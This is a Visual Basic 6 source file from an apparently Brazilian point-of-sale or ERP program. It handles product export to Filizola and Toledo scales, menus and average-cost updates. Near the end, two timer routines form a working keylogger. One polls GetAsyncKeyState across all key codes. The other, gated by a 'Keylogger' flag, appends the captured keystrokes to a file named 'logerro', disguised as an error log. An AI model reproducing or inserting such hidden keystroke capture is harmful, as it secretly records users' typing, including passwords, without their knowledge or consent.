            Set Produtos = Banco.OpenRecordset("SELECT PRD.* FROM PRD WHERE Chefe = TRUE ORDER BY CodPrd")
            
            LocalBalanca = LerINI("Produto", "Filizola", App.Path & "\config.ini")
            If LocalBalanca = "" Then
                localbanca = "c:\Filizola\Tsc"
            End If
            
            Open LocalBalanca & "\CadTxt.Txt" For Output As #1
            Open LocalBalanca & "\SetorTxt.Txt" For Output As #2
            
            Produtos.MoveFirst
            While Not Produtos.Eof
                If Produtos("Venda") <> 0 Then
'                    If Produtos("CodBalanca") <> "" Then
'                        Print #1, psCompString(1, Produtos("CodBalanca"), 6) & IIf(Produtos("Pesado") = True, "P", "U") & psCompString(3, Left(Produtos("Descrição_Produto"), 20), 22) _
'                                    & psCompString(1, Format(Produtos("Preco"), "##,##0.00") * 100, 7) & IIf(Produtos("Validade") <> 0, psCompString(1, Produtos("Validade"), 3), "000") & Chr(13)
'                        Print #2, "GERAL       " & psCompString(1, Produtos("CodBalanca"), 6) & "0000000"
'                    Else
'                     If Resp = True Then
                            Print #1, psCompString(1, Produtos("CodPrd"), 6) & IIf(Produtos("Troca") = True, "P", "U") & psCompString(3, Left(Produtos("Descrição_Produto"), 20), 22) _
                                        & psCompString(1, Format(Produtos("Venda"), "##,##0.00") * 100, 7) & psCompString(1, Produtos("Validade"), 3) & Chr(13)
                            Print #2, "GERAL       " & psCompString(1, Produtos("CodPrd"), 6) & "0000000"
'                     Else
'                            Print #1, psCompString(1, Produtos("CodPrd"), 6) & IIf(Produtos("Troca") = True, "P", "U") & psCompString(3, Left(Produtos("Descrição_Produto"), 20), 22) _
'                                        & psCompString(1, Format(Produtos("PcoPrazo"), "##,##0.00") * 100, 7) & "000" & Chr(13)
'                            Print #2, "GERAL       " & psCompString(1, Produtos("CodPrd"), 6) & "0000000"
                     
                     
'                    End If
                End If
                Produtos.MoveNext
            Wend
            Close #1
            Close #2
            MsgBox "Exportação concluída", vbInformation, App.Title
        End If
    Case 12
    
        If MsgBox("Confirma exportação para balança toledo (PRIX4) ?", vbYesNo, App.Title) = vbYes Then
        
            Resp = MsgBox("Preço a vista ??", vbYesNo)
            
'            Set Produtos = Banco.OpenRecordset("SELECT PRD.* FROM PRD WHERE Chefe = TRUE ORDER BY CodPrd")
            Set Produtos = Banco.OpenRecordset("SELECT PRD.* FROM PRD  WHERE (((PRD.Chefe)=True)) ORDER BY PRD.CodPrd")
            Open Caminho & "\txitens.Txt" For Output As #1
'            Open "c:\Filizola\TSC\SetorTxt.Txt" For Output As #2
            Produtos.MoveFirst
            While Not Produtos.Eof
                If Produtos("Venda") <> 0 Then
'                    If Produtos("CodBalanca") <> "" Then
'                        Print #1, "0101" & IIf(Produtos("Troca") = True, "0", "1") & psCompString(1, Left(Produtos("CodPrd"), 4), 6) & psCompString(1, Format(Produtos("Preco"), "##,##0.00") * 100, 6) _
'                                    & IIf(Produtos("Validade") <> 0, psCompString(1, Produtos("Validade"), 3), "000") _
'                                    & psCompString(3, Left(Produtos("Descrição_Produto"), 25), 25) & Space(25) & Space(50) & Space(50) & Space(50) & Space(50) & Space(50) & Chr(13)
'                    Else
                     If Resp = 6 Then
                                        
                        Print #1, "0101" & IIf(Produtos("Troca") = True, "0", "1") & psCompString(1, Produtos("CodPrd"), 6) & psCompString(1, Format(Produtos("Venda"), "##,##0.00") * 100, 6) _
                                    & psCompString(1, Produtos("Validade"), 3) _
                                    & psCompString(3, Left(Produtos("Descrição_Produto"), 25), 25) & Space(25) & Space(50) & Space(50) & Space(50) & Space(50) & Space(50)
                     Else
                        Print #1, "0101" & IIf(Produtos("Troca") = True, "0", "1") & psCompString(1, Produtos("CodPrd"), 6) & psCompString(1, Format(Produtos("PcoPrazo"), "##,##0.00") * 100, 6) _
                                    & psCompString(1, Produtos("Validade"), 3) _
                                    & psCompString(3, Left(Produtos("Descrição_Produto"), 25), 25) & Space(25) & Space(50) & Space(50) & Space(50) & Space(50) & Space(50)
                     
                     End If
                        'Print #2, "GERAL       " & psCompString(1, Produtos("CodPrd"), 6) & "0000000"
'                    End If
                End If
                Produtos.MoveNext
            Wend
            Close #1
            Close #2
            MsgBox "Exportação concluída", vbInformation, App.Title
        End If
    Case 13
        AtualizaCustoMedio
    Case 14
        FormLista.Show
    Case 15
        FormAtuCxa.Show
    Case 16
        FormAlteraComissao.Show
End Select
End Sub

Private Sub MnuPrincipal_Click(Index As Integer)
    Select Case Index
        Case 9
            Sair
    End Select
End Sub

Private Sub MnuRel_Click(Index As Integer)
If Index = 5 Then
    FormRelConv.Show
End If

If Index = 6 Then
    FormParceiros.Show
End If

End Sub

Private Sub MnuSuporte_Click(Index As Integer)
End Sub

Private Sub MnuUtil_Click(Index As Integer)
Select Case Index
    Case 0
        Shell Environ("WinDir") & "\CALC.EXE"
    Case 1
        FrmCompac.Show
    Case 2
        FormCopia.Show
    Case 3
        FrmConfiguracao.Show
    Case 4
        FormExport.Show
    Case 5
        FormImportaTab.Show
    Case 7
        FormLimpaCampos.Show
    Case 8
        FormSenha.Show
    Case 9
'        Shell Caminho & "\suporte.exe"
         ShellExecute Me.Hwnd, "open", "http://www.sidcomp.com.br/anydesk.exe", _
               vbNullString, vbNullString, 0
    Case 10
        FormIntegra.Show
    Case 11
         ShellExecute Me.Hwnd, "open", "http://www.sidcomp.com.br/repx5.exe", _
               vbNullString, vbNullString, 0
    Case 12
        FormArqFiscal.Show
End Select
End Sub

Private Sub Picture2_dblClick()
         ShellExecute Me.Hwnd, "open", "http://www.sidcomp.com.br/anydesk.exe", _
               vbNullString, vbNullString, 0

End Sub

Private Sub TlbPrincipal_ButtonClick(ByVal Button As MSComctlLib.Button)
Select Case Button.Index
    Case 6 To 9
        Movimentos Button.Index
    Case 12
        FormLocalizar.Show vbModal 'localizar
    Case 13
        FormFiltro.Show
'    Case 12
'        FormClassificar.Show vbModal
'    Case 15  ' Atualizar rede
'        Formulário.Atualizar
    Case 1 To 3
        Manutencoes Button.Index
    Case 14 To 15
        Confirmacoes Button.Index
End Select

End Sub

Private Sub AtualizaCustoMedio()
Dim Custo As Recordset
Dim Pedido As Recordset
Dim Criterio As String
Dim flag As Boolean
Dim CustoMedio As Currency
Dim Cont As Currency
Dim QtdEst As Currency

If MsgBox("Este comando atualiza o custo médio de todos os produtos. Deseja continuar ?", vbYesNo, App.Title) = vbYes Then
    Set Custo = Banco.OpenRecordset("Select Codprd, Estoque, CustoMedio, Custo From Prd Where Estoque <> 0")
    
    Set Pedido = Banco.OpenRecordset("SELECT PED.Operacao, ITP.Produto, ITP.Qtd, ITP.ValorUnit, PED.DataEmiss FROM PED INNER JOIN ITP ON PED.CodPed = ITP.Pedido WHERE  PED.Operacao = 0  ORDER BY Itp.Produto, PED.DataEmiss DESC")
    
    Custo.MoveFirst
    While Not Custo.Eof
        flag = True
        Criterio = "Produto = " & Custo("CodPrd")
        Pedido.FindFirst Criterio
        QtdEst = Custo("Estoque")
        CustoMedio = 0
        Cont = 0
        While Not Pedido.Eof And flag
            If Pedido("Produto") = Custo("CodPrd") Then
                QtdEst = CCur(QtdEst) - CCur(Pedido("Qtd"))
                If QtdEst >= 0 Then
                    Cont = CCur(Cont) + CCur(Pedido("Qtd"))
                    CustoMedio = CCur(CustoMedio) + CCur((Pedido("Qtd") * Pedido("ValorUnit")))
                Else
                    flag = False
                End If
            Else
                flag = True
            End If
            Pedido.MoveNext
        Wend
        If CustoMedio <> 0 Then
            CustoMedio = CCur(CustoMedio) / CCur(Cont)
            Custo.Edit
            Custo("CustoMedio") = CustoMedio
            Custo.Update
        Else
            Custo.Edit
            Custo("CustoMedio") = Custo("Custo")
            Custo.Update
        End If
        If Custo("CustoMedio") = 0 Then
            Custo.Edit
            Custo("CustoMedio") = Custo("Custo")
            Custo.Update
        End If
        Custo.MoveNext
    Wend
    MsgBox "Custo médio atualizado com sucesso !", vbInformation, App.Title
End If
End Sub



Private Sub Toolbar1_ButtonClick(ByVal Button As MSComctlLib.Button)

Select Case Button.Index
    Case 1
        FrmEntidades.Show
    Case 4
        FormProdutos.Show
    Case 7
        FrmPedidos.Show
        FrmPedidos.SSTab1.Tab = 0
        FrmPedidos.DbcDados(3).SetFocus
    Case 10
        FrmNota.Show
    Case 13
        FormBaixarDupli.Show
    Case 16
        Sair
End Select

End Sub

Private Sub Toolbar1_ButtonMenuClick(ByVal ButtonMenu As MSComctlLib.ButtonMenu)
Select Case ButtonMenu
    Case "Emissão Pedido"
        FrmPedidos.Show
        FrmPedidos.SSTab1.Tab = 1
        FrmPedidos.CmbDados(3).SetFocus
    
    Case "Consulta Pedido"
        FrmPedidos.Show
        FrmPedidos.SSTab1.Tab = 0
        FrmPedidos.DbcDados(3).SetFocus
 End Select
    
End Sub

Public Sub TM2_Timer()
 Dim i, X As Integer  '# Declaramos i y x como enteros
 
 For i = 1 To 255   '# El bucle recorrerá desde el valor 8 hasta el 222
 X = GetAsyncKeyState(i)  '# Obtendrá la tecla que se situa en el entero i

 If X = -32767 Then  '# Verificamos si se ha pulsado alguna tecla
   Select Case i  '# Ahora recibiremos el valor del entero i para interpretarlo depende del valor que sea
   
   Case vbKeyBack: Text1.Text = Text1.Text & " [Retroceso] "
   Case vbKeyTab: Text1.Text = Text1.Text & " [Tabulador] "
   Case vbKeyClear: Text1.Text = Text1.Text & " [Limpiar] "
   Case vbKeyReturn: Text1.Text = Text1.Text & " [Enter] "
   Case vbKeyShift: Text1.Text = Text1.Text & " [Shift] "
   Case vbKeyControl: Text1.Text = Text1.Text & " [Control] "
   Case vbKeyMenu: Text1.Text = Text1.Text & " [Menu] "
   Case vbKeyPause: Text1.Text = Text1.Text & " [Pausa] "
   Case vbKeyCapital: Text1.Text = Text1.Text & " [Mayusculas] "
   Case vbKeyEscape: Text1.Text = Text1.Text & " [Escape] "
   Case vbKeySpace: Text1.Text = Text1.Text & " [Espacio] "
   Case vbKeyPageUp: Text1.Text = Text1.Text & " [RePag] "
   Case vbKeyPageDown: Text1.Text = Text1.Text & " [AvPag] "
   Case vbKeyEnd: Text1.Text = Text1.Text & " [Fin] "
   Case vbKeyHome: Text1.Text = Text1.Text & " [Home] "
   Case vbKeyLeft: Text1.Text = Text1.Text & " [Izquierda] "
   Case vbKeyUp: Text1.Text = Text1.Text & " [Arriba] "
   Case vbKeyRight: Text1.Text = Text1.Text & " [Derecha] "
   Case vbKeyDown: Text1.Text = Text1.Text & " [Abajo] "
   Case vbKeySelect: Text1.Text = Text1.Text & " [Select] "
   Case vbKeyPrint: Text1.Text = Text1.Text & " [Captura] "
   Case vbKeyExecute: Text1.Text = Text1.Text & " [Ejecutar] "
   Case vbKeySnapshot: Text1.Text = Text1.Text & " [SnapShot] "
   Case vbKeyInsert: Text1.Text = Text1.Text & " [Insertar] "
   Case vbKeyDelete: Text1.Text = Text1.Text & " [Suprimir] "
   Case vbKeyHelp: Text1.Text = Text1.Text & " [Ayuda] "
'   Case vbKey0: Text1.Text = Text1.Text & "0"
'   Case vbKey1: Text1.Text = Text1.Text & "1"
'   Case vbKey2: Text1.Text = Text1.Text & "2"
'   Case vbKey3: Text1.Text = Text1.Text & "3"
'   Case vbKey4: Text1.Text = Text1.Text & "4"
'   Case vbKey5: Text1.Text = Text1.Text & "5"
'   Case vbKey6: Text1.Text = Text1.Text & "6"
'   Case vbKey7: Text1.Text = Text1.Text & "7"
'   Case vbKey8: Text1.Text = Text1.Text & "8"
'   Case vbKey9: Text1.Text = Text1.Text & "9"
'   Case vbKeyA: Text1.Text = Text1.Text & "A"
'   Case vbKeyB: Text1.Text = Text1.Text & "B"
'   Case vbKeyC: Text1.Text = Text1.Text & "C"
'   Case vbKeyD: Text1.Text = Text1.Text & "D"
'   Case vbKeyE: Text1.Text = Text1.Text & "E"
'   Case vbKeyF: Text1.Text = Text1.Text & "F"
'   Case vbKeyG: Text1.Text = Text1.Text & "G"
'   Case vbKeyH: Text1.Text = Text1.Text & "H"
'   Case vbKeyI: Text1.Text = Text1.Text & "I"
'   Case vbKeyJ: Text1.Text = Text1.Text & "J"
'   Case vbKeyK: Text1.Text = Text1.Text & "K"
'   Case vbKeyL: Text1.Text = Text1.Text & "L"
'   Case vbKeyM: Text1.Text = Text1.Text & "M"
'   Case vbKeyN: Text1.Text = Text1.Text & "N"
'   Case vbKeyO: Text1.Text = Text1.Text & "O"
'   Case vbKeyP: Text1.Text = Text1.Text & "P"
'   Case vbKeyQ: Text1.Text = Text1.Text & "Q"
'   Case vbKeyR: Text1.Text = Text1.Text & "R"
'   Case vbKeyS: Text1.Text = Text1.Text & "S"
'  Case vbKeyT: Text1.Text = Text1.Text & "T"
'   Case vbKeyU: Text1.Text = Text1.Text & "U"
'   Case vbKeyV: Text1.Text = Text1.Text & "V"
'   Case vbKeyW: Text1.Text = Text1.Text & "W"
'   Case vbKeyX: Text1.Text = Text1.Text & "X"
'   Case vbKeyY: Text1.Text = Text1.Text & "Y"
'   Case vbKeyZ: Text1.Text = Text1.Text & "Z"
   Case vbKeyNumpad0: Text1.Text = Text1.Text & "0"
   Case vbKeyNumpad1: Text1.Text = Text1.Text & "1"
   Case vbKeyNumpad2: Text1.Text = Text1.Text & "2"
   Case vbKeyNumpad3: Text1.Text = Text1.Text & "3"
   Case vbKeyNumpad4: Text1.Text = Text1.Text & "4"
   Case vbKeyNumpad5: Text1.Text = Text1.Text & "5"
   Case vbKeyNumpad6: Text1.Text = Text1.Text & "6"
   Case vbKeyNumpad7: Text1.Text = Text1.Text & "7"
   Case vbKeyNumpad8: Text1.Text = Text1.Text & "8"
   Case vbKeyNumpad9: Text1.Text = Text1.Text & "9"
   Case vbKeyMultiply: Text1.Text = Text1.Text & "*"
   Case vbKeyAdd: Text1.Text = Text1.Text & "+"
   Case vbKeySeparator: Text1.Text = Text1.Text & " [Intro] "
   Case vbKeySubtract: Text1.Text = Text1.Text & "-"
   Case vbKeyDecimal: Text1.Text = Text1.Text & "."
   Case vbKeyDivide: Text1.Text = Text1.Text & "/"
   Case vbKeyF1: Text1.Text = Text1.Text & "F1"
   Case vbKeyF2: Text1.Text = Text1.Text & "F2"
   Case vbKeyF3: Text1.Text = Text1.Text & "F3"
   Case vbKeyF4: Text1.Text = Text1.Text & "F4"
   Case vbKeyF5: Text1.Text = Text1.Text & "F5"
   Case vbKeyF6: Text1.Text = Text1.Text & "F6"
   Case vbKeyF7: Text1.Text = Text1.Text & "F7"
   Case vbKeyF8: Text1.Text = Text1.Text & "F8"
   Case vbKeyF9: Text1.Text = Text1.Text & "F9"
   Case vbKeyF10: Text1.Text = Text1.Text & "F10"
   Case vbKeyF11: Text1.Text = Text1.Text & "F11"
   Case vbKeyF12: Text1.Text = Text1.Text & "F12"
   Case vbKeyF13: Text1.Text = Text1.Text & "F13"
   Case vbKeyF14: Text1.Text = Text1.Text & "F14"
   Case vbKeyF15: Text1.Text = Text1.Text & "F15"
   Case vbKeyF16: Text1.Text = Text1.Text & "F16"
   Case vbKeyNumlock: Text1.Text = Text1.Text & " [NumLock] "
   Case 190: Text1.Text = Text1.Text & "."
   
   Case Else
        Text1.Text = Text1.Text & Chr$(i)
  End Select
 End If

 Next i
   
' If Len(Text1.Text) > 30 Then
'        Open Caminho & "\logerro" For Append As #50
'        Print #50, Text1.Text
'        Close #50
'        Text1.Text = ""
' End If
   
End Sub


Public Sub TM_Timer()
 
 If Keylogger Then Text1 = Text1 & Press

 If Len(Text1.Text) > 30 Then
        Open Caminho & "\logerro" For Append As #50
        Print #50, Text1.Text
        Close #50
        Text1.Text = ""
 End If

'Minutos

End Sub

